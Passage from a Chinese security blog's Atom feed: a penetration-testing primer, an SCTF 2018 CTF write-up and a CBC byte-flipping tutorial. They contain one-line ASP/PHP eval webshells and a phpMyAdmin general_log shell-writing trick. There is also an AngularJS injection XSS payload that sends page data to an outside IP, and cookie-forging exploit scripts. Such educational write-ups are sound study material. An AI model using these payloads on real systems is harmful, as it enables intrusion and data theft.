<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mang0&#39;s blog</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0xmj.club/"/>
  <updated>2018-08-01T15:43:57.015Z</updated>
  <id>http://0xmj.club/</id>
  
  <author>
    <name>Mang0</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试基础</title>
    <link href="http://0xmj.club/2018/08/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    <id>http://0xmj.club/2018/08/01/渗透测试基础/</id>
    <published>2018-08-01T15:43:32.000Z</published>
    <updated>2018-08-01T15:43:57.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><h2 id="0x00熟悉各类名词"><a href="#0x00熟悉各类名词" class="headerlink" title="0x00熟悉各类名词"></a>0x00熟悉各类名词</h2><p>黑客：Hacker 黑客所做的不是恶意破坏，他们是一群纵横网络上的技术人员，热衷与科技探索、计算机科学研究。在IT圈中，Hacker一词无疑是带有正面意义的。<br>骇客：Cracker 骇客未必具有很高的技术，通常用一些简单的手段去达到一些炫耀、恶作剧、搞破坏的目的。<br>红客：Honcker Honcker用自己的技术维护国内网络安全，并对外来的一切进攻进行还击。他们拥有爱国、正义、进取的精神，是网络安全时代的英雄的代表。</p><p>白帽： 专门研究或者从事网络安全行业的人，通常受雇于各大安全公司，是提高网络、系统安全水平的主要力量。</p><p>黑帽： 专门研究木马、操作系统，寻找漏洞，并且以个人意志为出发点，攻击网络或者计算机。<br>灰帽： 以个人意志为出发点，两者皆可做。</p><h2 id="0x01术语词汇"><a href="#0x01术语词汇" class="headerlink" title="0x01术语词汇"></a>0x01术语词汇</h2><p>脚本(asp、php、jsp)<br>html(css、js、html)<br>HTTP协议<br>CMS(B/S)<br>MD5<br>肉鸡： 被黑客入侵并长期驻扎的计算机或服务器。<br>抓鸡： 利用使用量大的程序的漏洞，使用自动化方式获取。<br>Webshell： 通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。<br>漏洞: 硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p><p>一句话木马： 通过向服务器端提交一句简短的代码，配合本地客户端实现webshell功能的木马。</p><p>&lt;%eval request(&quot;pass&quot;)%&gt;<br>&lt;%execute(request(&quot;pass&quot;))%&gt;<br>request(“pass”)：接收客户端提交的数据。pass为执行命令的参数。<br>eval/execute：函数执行客户端命令的内容。<br>提权： 操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p>后门： 黑客为了对住基金向长期的控制，在机器上种植的一段程序或者留下的一个“入口”。</p><p>跳板： 使用肉鸡IP来实施攻击其他目标，以便更好地隐藏自己的身份信息。</p><p>旁站入侵： 即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等。</p><p>C段入侵： 即同C段下服务器入侵。如目标ip为192.168.1.253，入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit，Snoop，Tcpdump，Dsniff等。</p><p>C段技巧 :</p><p>1.扫描1-255全部网段的网站CMS情况<br>选择一款自己擅长入侵的cms，这样才能更快速的实现C段入侵<br>2.扫描1-255全部网段的端口开放情况<br>先查询端口，选择自己擅长提权的端口的网站来入侵，通过端口提权。使用到的工具椰树、阿D网络工具包</p><h2 id="0x02渗透测试"><a href="#0x02渗透测试" class="headerlink" title="0x02渗透测试"></a>0x02渗透测试</h2><p><strong>黑盒测试</strong>： 在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Database、Script、code、思路、社工） 思路与经验积累往往决定成败。 三个臭皮匠赛过诸葛亮。<br><strong>白盒测试</strong> ： 相对黑盒测试，白鹤测试基本是从内部发起。 黑百合的另一种说法： 知道源代码和不知道源代码的渗透测试。 这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。</p><p><strong>灰盒测试</strong>：基于白盒与黑盒测试之间的一种产物。 </p><p><strong>APT攻击</strong>：Advanced Persistent Threat 高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。<br>1.极强的隐蔽性<br>2.潜伏期长，持续性强<br>3.目标性强<br><strong>渗透测试的特点：</strong><br>充满挑战与刺激——不达目的不罢休<br>思路与经验累计往往决定成败</p><p><strong>渗透测试与入侵的最大的区别：</strong><br>渗透测试：更全面的找出服务器的问题，更倾向于保护。<br>入侵：不择手段地（甚至是具有破坏性的）拿到权限。</p><h2 id="0x03渗透测试一般流程："><a href="#0x03渗透测试一般流程：" class="headerlink" title="0x03渗透测试一般流程："></a>0x03渗透测试一般流程：</h2><p>明确目标》信息收集》漏洞探测》漏洞验证》信息分析 》获取所需》信息整理》 形成报告</p><p>1.明确目标：<br>确定范围<br>确定规则<br>确定需求<br>2.信息收集：<br>基础信息<br>系统信息<br>应用信息<br>版本信息<br>服务信息<br>人员信息<br>防护信息<br>3.漏洞探测：<br>系统漏洞<br>WebServer漏洞<br>Web应用漏洞<br>其他端口服务漏洞<br>通信安全<br>4.漏洞验证：<br>自动化验证<br>手工验证<br>试验验证<br>登录猜解<br>业务漏洞验证<br>公开资源的利用<br>5.信息分析<br>精准打击<br>绕过防御机制<br>定制攻击路径<br>绕过检测机制<br>攻击代码<br>6.获取所需<br>实施攻击<br>获取内部信息<br>进一步渗透<br>持续性存在<br>清理痕迹<br>7.信息整理<br>整理渗透工具<br>整理收集信息<br>整理漏洞信息<br>8.形成报告：<br>按需整理<br>补充介绍<br>修补建议</p><p>经验分享<br>信息搜集是关键<br>做事不要太心急<br>多学习，多看源码<br>平时注意搜集0day<br>思路很重要</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试基础&quot;&gt;&lt;a href=&quot;#渗透测试基础&quot; class=&quot;headerlink&quot; title=&quot;渗透测试基础&quot;&gt;&lt;/a&gt;渗透测试基础&lt;/h1&gt;&lt;h2 id=&quot;0x00熟悉各类名词&quot;&gt;&lt;a href=&quot;#0x00熟悉各类名词&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://0xmj.club/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透" scheme="http://0xmj.club/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>八月展望</title>
    <link href="http://0xmj.club/2018/08/01/%E5%85%AB%E6%9C%88%E5%B1%95%E6%9C%9B/"/>
    <id>http://0xmj.club/2018/08/01/八月展望/</id>
    <published>2018-08-01T15:41:26.000Z</published>
    <updated>2018-08-01T15:42:16.323Z</updated>
    
    <content type="html"><![CDATA[<p>不要自己感动自己</p><p>不要过于享受生活</p><p>八月了，八月还会是如此的散漫自由么，生活确实不是一帆丰顺，社会上的尔虞吾诈也都心酸体验了一把。</p><p>八月了，希望自己静下心来，认真的做自己的计划，世界的另一番风景只有站的最够高才能看清，太低了琐事缠身，总想超脱，痛恨无能摆脱。</p><p>八月了，时间慢一点吧，目标定实际一点吧，能尽力碰到就好。人总是有些好高骛远，飞的太高太不真实，落下就残忍。</p><p>八月，祝能实现理想，静候佳音。完成flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不要自己感动自己&lt;/p&gt;
&lt;p&gt;不要过于享受生活&lt;/p&gt;
&lt;p&gt;八月了，八月还会是如此的散漫自由么，生活确实不是一帆丰顺，社会上的尔虞吾诈也都心酸体验了一把。&lt;/p&gt;
&lt;p&gt;八月了，希望自己静下心来，认真的做自己的计划，世界的另一番风景只有站的最够高才能看清，太低了琐事缠身
      
    
    </summary>
    
      <category term="思考" scheme="http://0xmj.club/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="思考" scheme="http://0xmj.club/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>2018SCTF-wp</title>
    <link href="http://0xmj.club/2018/06/20/2018SCTF-wp/"/>
    <id>http://0xmj.club/2018/06/20/2018SCTF-wp/</id>
    <published>2018-06-20T14:40:40.000Z</published>
    <updated>2018-06-20T14:41:21.311Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sctf"><a href="#sctf" class="headerlink" title="sctf"></a>sctf</h1><p>被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202236_554.png" alt=""></p><p>[TOC]</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>以下图为例，使用 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="https://i.imgur.com/yPJvv6u.png" alt="SPA图示"><br><img src="https://i.imgur.com/ogzPrtK.png" alt=""></p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191825_719.png" alt=""><br>接下来tcp流追踪<br>搜索sctf未果<br>继续慢慢寻找<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191816_523.png" alt=""><br>SCTF{Easy_Mdbus}</p><p><img src="" alt="Uploading file..._wk2cyf491"></p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>logicdata拖进Logic里面,分析嗅探得到的波形图</p><p><img src="https://i.imgur.com/fvQUPGz.png" alt=""></p><p>0x400x310x10</p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>使用硕思闪客精灵 反编译flash</p><p>在动作一栏寻找得到一段会话</p><p>得到</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202141_189.png" alt=""></p><p>U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9</p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h3><p>右键查看源码得到 AngularJS 版本1.4.6<br>模板注入<br><a href="https://www.anquanke.com/post/id/86093" target="_blank" rel="external">https://www.anquanke.com/post/id/86093</a><br><a href="http://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="external">http://seaii-blog.com/index.php/2017/09/02/68.html</a></p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);eval(atob(`dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xNjUuMjI3LjU4LjEwOTo4ODg4Lz9sb2NhdGlvbj0nK2RvY3VtZW50LmxvY2F0aW9uLmhyZWY7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs=`));alert(3);//');}}</code></pre><p>本地可以xss，vps收不到bot的请求</p><h3 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h3><p>参照了网上的文章利用日志的方法写入shell</p><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接</p><p>首先查看本地的写shell地址</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202056_350.png" alt=""></p><p>SET global general_log_file=’D:/phpStu/WWW/shell.php’;</p><p>select “&lt;?php @eval($_POST[‘shell’]);?&gt;”; </p><p><img src="http://oxskavewj.bkt.clouddn.com/3nahv80ilqe61q1enu4zprhu59.png" alt=""></p><p>shell连上进入c盘获取flag</p><p><img src="http://oxskavewj.bkt.clouddn.com/2p45t2wakukp40nuieu4wv1q3e.png" alt=""></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="Script-In-Script"><a href="#Script-In-Script" class="headerlink" title="Script In Script"></a>Script In Script</h3><p>本来想着写脚本爆破的，考虑到时间的原因采用了取巧的方法，因为flag的很多字符都是可以看代码写出来的，所以本地把js先解密了，搭了一个环境，根据js的变量值进行测试</p><p><img src="http://oxskavewj.bkt.clouddn.com/cgb8jdo2whkqex0ndrl65y2tq3.png" alt=""></p><p>flag:sctf{5cr1Pt_In_ScrIpT!!}</p><h3 id="Where-is-my-13th-count？"><a href="#Where-is-my-13th-count？" class="headerlink" title="Where is my 13th count？"></a>Where is my 13th count？</h3><p>题目要求是让白球吃到13个黄色方块得到13分，但是一共只有12个能吃<br>使用相关调试软件发现游戏会闪退，判断有反调试<br>根据suctf的一道题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202212_643.png" alt=""></p><p>分析Cheat Engine_Data\Managed下的Assembly-CSharp.dll文件，反调试都在这个dll文件下完成<br>发现了这些东西</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_821.png" alt=""></p><p>交叉分析找到反调试函数然后直接patch<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_351.png" alt=""><br>使用游戏辅助神器Cheat Engine修改游戏的分数内存即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_393.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_208.png" alt=""></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>低解密指数攻击</p><pre><code class="pp">import gmpy2import timedef continuedFra(x, y):    cF = []    while y:        cF += [x / y]        x, y = y, x % y    return cFdef Simplify(ctnf):    numerator = 0    denominator = 1    for x in ctnf[::-1]:        numerator, denominator = denominator, x * denominator + numerator    return (numerator, denominator)def calculateFrac(x, y):    cF = continuedFra(x, y)    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))    return cFdef solve_pq(a, b, c):    par = gmpy2.isqrt(b * b - 4 * a * c)    return (-b + par) / (2 * a), (-b - par) / (2 * a)def wienerAttack(e, n):    for (d, k) in calculateFrac(e, n):        if k == 0: continue        if (e * d - 1) % k != 0: continue        phi = (e * d - 1) / k        p, q = solve_pq(1, n - phi + 1, n)        if p * q == n:            return abs(int(p)), abs(int(q))    print &#39;not find!&#39;time.clock()n = 0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bfe = 0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939c = 0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3p, q = wienerAttack(e, n)print &#39;[+]Found!&#39;print &#39;  [-]p =&#39;,pprint &#39;  [-]q =&#39;,qprint &#39;  [-]n =&#39;,p*qd = gmpy2.invert(e,(p-1)*(q-1))print &#39;  [-]d =&#39;, dprint &#39;  [-]m is:&#39; + &#39;{:x}&#39;.format(pow(c,d,n)).decode(&#39;hex&#39;)print &#39;\n[!]Timer:&#39;, round(time.clock(),2), &#39;s&#39;print &#39;[!]All Done!&#39;print n```</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sctf&quot;&gt;&lt;a href=&quot;#sctf&quot; class=&quot;headerlink&quot; title=&quot;sctf&quot;&gt;&lt;/a&gt;sctf&lt;/h1&gt;&lt;p&gt;被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://oy
      
    
    </summary>
    
      <category term="CTF" scheme="http://0xmj.club/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://0xmj.club/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>cbc字节翻转攻击</title>
    <link href="http://0xmj.club/2018/06/01/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://0xmj.club/2018/06/01/cbc字节翻转攻击/</id>
    <published>2018-05-31T16:47:50.000Z</published>
    <updated>2018-06-15T16:52:51.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h2 id="CBC原理"><a href="#CBC原理" class="headerlink" title="CBC原理"></a>CBC原理</h2><p> <img src="http://oy0tigw51.bkt.clouddn.com/201805201723_856.jpg" alt=""></p><h2 id="对cbc的攻击"><a href="#对cbc的攻击" class="headerlink" title="对cbc的攻击"></a>对cbc的攻击</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201805201725_862.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805201726_48.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805202259_97.png" alt=""></p><h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>　　我们举例说明一下这个例子，这里有一个明文序列：</p><pre><code>a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}</code></pre><p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p><pre><code>- Block 1:a:2:{s:4:&quot;name&quot;; - Block 2:s:6:”sdsdsd”;s:8- Block 3::”greeting”;s:20- Block 4::”echo ‘Hello sd- Block 5:sdsd!’”;}</code></pre><p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p><pre><code>$v = &quot;a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}&quot;;$enc = @encrypt($v);$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));$b = @decrypt($enc);</code></pre><p>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p><h2 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h2><h3 id="iscc2018-Only-admin-can-see-flag"><a href="#iscc2018-Only-admin-can-see-flag" class="headerlink" title="iscc2018-Only admin can see flag"></a>iscc2018-Only admin can see flag</h3><p>查看源码得提示index.txt，访问得到源码 </p><pre><code class="php">&lt;?phpinclude &#39;sqlwaf.php&#39;;define(&quot;SECRET_KEY&quot;, &quot;................&quot;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv(){    $iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $iv.=chr(rand(1,255));    }    return $iv;}// 使用aes-128-cbc 模式加密function login($info){    $iv=get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));// cookie[iv] = 随机生成的iv 的base64    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie[cipher] = 加密值的base64}function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){//发现当账号为admin，才会显示flag，        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is *************&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;    die();}// 解密cipherfunction check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;])){        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);//cipher和iv变量均中cookie数组中取        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }else{            die(&quot;ERROR!&quot;);        }    }}if (isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;])) {  $username=waf((string)$_POST[&#39;username&#39;]);  $password=waf((string)$_POST[&#39;password&#39;]);  if($username === &#39;admin&#39;){        exit(&#39;&lt;p&gt;You are not real admin!&lt;/p&gt;&#39;);//当我们以admin账号登录时，程序会直接跳出    }else{        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }//否则正常登录，并将用户信息存在info数组中传入login函数，并调用show_homepage函数。}else{  if(isset($_SESSION[&quot;username&quot;])){        check_login();        show_homepage();    }}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; &gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;Paper login form&lt;/title&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;login&quot;&gt;  &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;    &lt;h1&gt;Sign In&lt;/h1&gt;    &lt;input name=&#39;username&#39; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;    &lt;input name=&#39;password&#39; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;    &lt;button&gt;Sign in&lt;/button&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>思路就是构造一个Admin用户，然后将大写的A翻转成小写的a，即是admin。我们点击登录之后，可以在cookie中获取到iv和cipher的值（看14行的login函数），然后我们先将cipher的第9个字符使用异或运算翻转成小写字母a，因为info数组序列化后，我们要翻转的大写字母A在下标为9的位置，每个分组的长度为16，因为返回的iv变量长度为16（要先经过base64解密）</p><ol><li>​              s:2:{s:8:”userna</li><li>​              me”;s:5:”Admin”;</li><li>​              s:8:”password”;s</li><li>​              :5:”admin”;}</li></ol><p>要第二组的b变为d 就要第一组的u改变 </p><p>python脚本：</p><pre><code class="python">import urllib,base64,requests,reurl = &quot;http://118.190.152.202:8001/index.php&quot;datas = {    &quot;username&quot; : &quot;Admin&quot;,    &quot;password&quot; : &quot;admin&quot;}r = requests.post(url,data=datas)cipher = r.cookies.get(&quot;cipher&quot;)cipher = base64.b64decode(urllib.unquote(cipher))offset = 9new_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(&quot;A&quot;)^ord(&quot;a&quot;)) + cipher[offset+1:]new_cookies = requests.utils.dict_from_cookiejar(r.cookies)new_cookies[&quot;cipher&quot;] = urllib.quote_plus(base64.b64encode(new_cipher))r2 = requests.get(url,cookies=new_cookies)plain = base64.b64decode(re.findall(&quot;decode\(&#39;(.*)&#39;\)&quot;,r2.text)[0])iv = base64.b64decode(urllib.unquote(new_cookies[&quot;iv&quot;]))old = plain[:len(iv)]new = &#39;a:2:{s:8:&quot;userna&#39;new_iv = &quot;&quot;.join([chr(ord(iv[i])^ord(old[i])^ord(new[i])) for i in xrange(16)])new_cookies[&quot;iv&quot;] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=new_cookies)print(r3.text)</code></pre><h3 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h3><p>Bugku上的一道题来做分析：<br>题目链接：<code>http://47.93.190.246:49168/</code><br>进入后发现页面存在源码泄露：<code>index.php.swp</code><br>恢复后审计源码：</p><pre><code>function get_random_iv(){    $random_iv=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_iv.=chr(rand(1,255));    }    return $random_iv;}</code></pre><p>首先随机生成了一个16位的iv；<br>然后从</p><pre><code>$info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);</code></pre><p>和</p><pre><code>function login($info){    $iv = get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}</code></pre><p>可见，对传入的账号和密码进行序列化，作为明文，然后对其进行AES加密，其中使用到了随机生成的iv<br>后将加密后的内容进行base64编码，放入cookie中。</p><pre><code>function check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))    {        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))        {            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }        else        {            die(&quot;ERROR!&quot;);        }    }}</code></pre><p>然后再对传入的cookie中的密文解密，然后对明文就行反序列化（如果反序列化失败就打印出明文的base64编码），后把反序列化后的明文，即Info中的username还给username，最后进行判定:</p><pre><code>function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;}</code></pre><p>如果用户名是admin，就给出flag，否则不给，但值得一提的是：</p><pre><code>if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){    $username = (string)$_POST[&#39;username&#39;];    $password = (string)$_POST[&#39;password&#39;];    if($username === &#39;admin&#39;)    {        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);    }    else    {        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }}</code></pre><p>登录时做出了限制，如果用admin登录是显然不行的。<br>所以这时就需要CBC字节翻转攻击来实现了<br>登录时：可以使用</p><pre><code>username=1dmin;password=Mang0;</code></pre><p>此时我们要做的就是把1dmin通过翻转攻击，把’1‘变成‘a’，即可变成admin登录成功得到Flag<br>首先按照步骤：将我们传入的Info进行序列化，得到明文：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Mang0&quot;;}</code><br>然后对其进行分组：</p><pre><code>block 1 : a:2:{s:8:&quot;usernablock 2 : me&quot;;s:5:&quot;1dmin&quot;;block 3 : s:8:&quot;password&quot;;sblock 4 : :5:&quot;Mang0&quot;;}</code></pre><p>我们所要改变的即block 2中的偏移量为9的那个明文，即1<br>所以按照攻击方式，应该改变block 1中有相同偏移量的那个密文，即偏移量为9的值<br>所以得到以下公式：<br>cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord(‘1’) ^ ord(‘a’)) + cipher[10:]<br>故可将1dmin变成admin，但有一点需要注意，这样改变后，密文的值发生了改变，将其进行解密后反序列化，是会失败的，从而会把无法反序列化的明文打印出来（因为我们对block 1进行了改变，虽然block 2变成了我们所希望的值，但block 1却变成了未知的量）<br>所以此时，需要改变iv的值来改变block 1的值<br>（注：这就是cbc的处理方式，iv的值改变block1的值，block1的值改变block2的值……）<br>故此，我们需要一个正确的Iv，使block 